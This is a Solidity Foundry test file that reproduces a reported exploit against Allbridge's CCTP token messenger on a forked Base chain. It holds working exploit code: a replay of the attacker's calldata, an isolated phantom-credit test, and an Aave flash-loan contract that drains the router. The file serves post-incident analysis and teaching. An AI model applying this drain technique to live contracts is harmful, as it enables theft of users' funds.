// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$191,156 USDC (attacker net ~189,752 after Aave premium + 10bp fee)
// Attacker EOA      : 0x2419432344b0b892e592b2601b98eae702ba360e
// Exploit harness   : 0xb6fBDFA5F3CBEB139D4ccE86D92F4ac8687B16c0
// Logic (initcode)  : 0xe9edf1582ed9520f7149669d9c6bf3276b02477e (created in attack tx)
// Victim Router     : 0xaA119F7442Ecc28b9a8f236707aDa8362cFF24fF
// CCTPTokenMessenger: 0xf9b710E427bf4d93598e0F80A84dE22C7Ad9b577 (bug)
// Attack tx         : https://basescan.org/tx/0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8
// Forged sendMessage: https://polygonscan.com/tx/0x2a88d79756b4547b33fea7b3c1420793680e2b8952bef4c65e99879e16b22140
// Analysis          : https://defimon.xyz/blog/allbridge-hack-august-2026
// Alert             : https://x.com/DefimonAlerts/status/2090369928494719263
//
// Root cause: CCTPTokenMessenger.receiveCctpMessage relays an attested Circle
// MessageTransmitterV2 payload, then books `receivedMessages[hookDataHash] =
// amount - feeExecuted` from attacker-authored body fields WITHOUT observing any
// USDC mint/balance increase. A generic Polygon sendMessage (minted 0) was
// redeemed after a real ~191k USDC inflow; Router.receiveToken paid 999k USDC
// after an Aave flash-loan top-up of the shortfall.

address constant ATTACKER = 0x2419432344b0B892E592b2601B98eaE702Ba360e;
address constant HARNESS = 0xb6fBDFA5F3CBEB139D4ccE86D92F4ac8687B16c0;
address constant ROUTER = 0xaA119F7442eCC28b9a8F236707ADA8362CFF24fF;
address constant MESSENGER = 0xf9B710E427bf4D93598E0F80A84de22C7Ad9B577;
address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant AAVE_POOL = 0xA238Dd80C259a72e81d7e4664a9801593F98d1c5;

// Attack mined in Base block 50157345; fork one block earlier (post legitimate
// ~191k USDC mint at 50157342, pre-drain).
uint256 constant FORK_BLOCK = 50_157_344;

// hookData / Router message hash for (nonce=12345, recipient=HARNESS, USDC,
// normalizedAmount=1e15, sourceChain=12345, CHAIN_ID=9)
bytes32 constant HOOK_HASH = 0xe15a0288fb4a60804a866655fdf08a6d3e51c3ca58f5d400e8620e7069aac52e;

uint256 constant DECLARED_USDC = 1_000_000e6;
// Live net after Aave premium ≈ 189_752; router held ≈ 191_156
uint256 constant EXPECTED_NET_MIN = 189_000e6;
uint256 constant EXPECTED_NET_MAX = 191_156e6;

interface ICCTPTokenMessenger {
    function receiveCctpMessage(bytes calldata message, bytes calldata attestation) external;
    function receivedMessages(bytes32 messageHash) external view returns (uint256);
}

interface IRouter {
    function receiveToken(
        uint256 normalizedAmount,
        uint256 _nonce,
        uint32 sourceChain,
        bytes32 destinationToken,
        bytes32 recipient,
        address swapAddr,
        address tokenMessengersAddr,
        uint256 minSwapAmount
    ) external;
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

abstract contract AllbridgeForkSetup is BaseTestWithBalanceLog {
    function _forkBase() internal {
        // Online warm uses alias "base" (foundry.toml [rpc_endpoints]); offline
        // run_poc.sh / exhaustive_warm rewrite this to http://127.0.0.1:8548.
        vm.createSelectFork("http://127.0.0.1:8548", FORK_BLOCK);

        fundingToken = USDC;
        attacker = HARNESS;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HARNESS, "Exploit harness");
        vm.label(ROUTER, "Allbridge Router");
        vm.label(MESSENGER, "CCTPTokenMessenger");
        vm.label(USDC, "USDC");
        vm.label(AAVE_POOL, "Aave V3 Pool");
    }
}

contract AllbridgeCctpPhantomDeposit_exp is AllbridgeForkSetup {
    function setUp() public {
        _forkBase();
    }

    /// @dev Full historical replay: prank attacker EOA, call harness with the
    ///      exact attack tx input (initcode deploy → receiveCctpMessage → Aave
    ///      flashLoanSimple → Router.receiveToken).
    function testExploit() public balanceLog {
        uint256 routerBefore = IERC20(USDC).balanceOf(ROUTER);
        emit log_named_decimal_uint("Router USDC before", routerBefore, 6);
        assertGe(routerBefore, 191_000e6, "expected post-inflow router balance");

        bytes memory data = vm.parseBytes(vm.readFile("test/fixtures/attack_calldata.hex"));

        uint256 before_ = IERC20(USDC).balanceOf(HARNESS);
        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok, bytes memory ret) = HARNESS.call(data);
        vm.stopPrank();
        if (!ok) {
            emit log_named_bytes("revert", ret);
            revert("historical harness call failed");
        }

        uint256 profit = IERC20(USDC).balanceOf(HARNESS) - before_;
        emit log_named_decimal_uint("Harness USDC profit", profit, 6);
        emit log_named_decimal_uint("Router USDC after", IERC20(USDC).balanceOf(ROUTER), 6);

        assertGe(profit, EXPECTED_NET_MIN, "profit below expected band");
        assertLe(profit, EXPECTED_NET_MAX, "profit above expected band");
        assertLt(IERC20(USDC).balanceOf(ROUTER), 2_000e6, "router should be drained");
    }

    /// @dev Isolates the bug: receiveCctpMessage books a 1M USDC credit from an
    ///      attested generic sendMessage while messenger/router USDC do not rise.
    ///      The forged message's CCTP recipient is HARNESS; MessageTransmitter
    ///      callbacks handleReceiveFinalizedMessage there. The live harness only
    ///      accepts that callback while its initcode exploit is in flight, so we
    ///      mock a successful receiver for this isolated credit test.
    function testPhantomCredit_noMint() public {
        bytes memory message = vm.parseBytes(vm.readFile("test/fixtures/message.hex"));
        bytes memory attestation = vm.parseBytes(vm.readFile("test/fixtures/attestation.hex"));

        uint256 messengerBefore = IERC20(USDC).balanceOf(MESSENGER);
        uint256 routerBefore = IERC20(USDC).balanceOf(ROUTER);
        assertEq(ICCTPTokenMessenger(MESSENGER).receivedMessages(HOOK_HASH), 0);

        _mockHarnessReceiveOk();
        ICCTPTokenMessenger(MESSENGER).receiveCctpMessage(message, attestation);

        uint256 credited = ICCTPTokenMessenger(MESSENGER).receivedMessages(HOOK_HASH);
        emit log_named_decimal_uint("Phantom credit booked", credited, 6);

        assertEq(credited, DECLARED_USDC, "credited amount-feeExecuted from body");
        assertEq(IERC20(USDC).balanceOf(MESSENGER), messengerBefore, "messenger USDC unchanged");
        assertEq(IERC20(USDC).balanceOf(ROUTER), routerBefore, "router USDC unchanged by credit");
    }

    function _mockHarnessReceiveOk() internal {
        // bool handleReceiveFinalizedMessage(uint32,bytes32,uint32,bytes)
        vm.mockCall(
            HARNESS,
            abi.encodeWithSelector(bytes4(keccak256("handleReceiveFinalizedMessage(uint32,bytes32,uint32,bytes)"))),
            abi.encode(true)
        );
    }
}

/// @dev Teaching path with explicit Aave flash-loan top-up + pranked redeem.
contract AllbridgeCctpPhantomDepositFlash_exp is AllbridgeForkSetup {
    bool internal _redeemArmed;

    function setUp() public {
        _forkBase();
    }

    function redeemAndPullRepay(address repayTo, uint256 repayAmount) external {
        require(_redeemArmed, "not armed");
        vm.startPrank(HARNESS);
        IRouter(ROUTER).receiveToken(
            1_000_000_000_000_000,
            12345,
            12345,
            bytes32(uint256(uint160(USDC))),
            bytes32(uint256(uint160(HARNESS))),
            address(0),
            MESSENGER,
            0
        );
        IERC20(USDC).transfer(repayTo, repayAmount);
        vm.stopPrank();
    }

    function testStepByStepFlashLoanDrain() public {
        bytes memory message = vm.parseBytes(vm.readFile("test/fixtures/message.hex"));
        bytes memory attestation = vm.parseBytes(vm.readFile("test/fixtures/attestation.hex"));

        // See testPhantomCredit_noMint — mock CCTP recipient callback on HARNESS.
        vm.mockCall(
            HARNESS,
            abi.encodeWithSelector(bytes4(keccak256("handleReceiveFinalizedMessage(uint32,bytes32,uint32,bytes)"))),
            abi.encode(true)
        );
        ICCTPTokenMessenger(MESSENGER).receiveCctpMessage(message, attestation);
        assertEq(ICCTPTokenMessenger(MESSENGER).receivedMessages(HOOK_HASH), DECLARED_USDC);

        uint256 harnessBefore = IERC20(USDC).balanceOf(HARNESS);
        uint256 shortfall = DECLARED_USDC - IERC20(USDC).balanceOf(ROUTER);

        _redeemArmed = true;
        FlashReceiverOwned recv = new FlashReceiverOwned(address(this));
        recv.run(shortfall);
        _redeemArmed = false;

        uint256 profit = IERC20(USDC).balanceOf(HARNESS) - harnessBefore;
        emit log_named_decimal_uint("Step-by-step harness USDC profit", profit, 6);
        assertGe(profit, EXPECTED_NET_MIN, "step profit low");
        assertLe(profit, EXPECTED_NET_MAX, "step profit high");
        assertLt(IERC20(USDC).balanceOf(ROUTER), 2_000e6, "router should be drained");
    }
}

contract FlashReceiverOwned {
    address public immutable hook;

    constructor(address hook_) {
        hook = hook_;
    }

    function run(uint256 shortfall) external {
        IAavePool(AAVE_POOL).flashLoanSimple(address(this), USDC, shortfall, bytes(""), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_POOL && initiator == address(this) && asset == USDC);
        IERC20(USDC).transfer(ROUTER, amount);
        AllbridgeCctpPhantomDepositFlash_exp(hook).redeemAndPullRepay(address(this), amount + premium);
        IERC20(USDC).approve(AAVE_POOL, amount + premium);
        return true;
    }
}
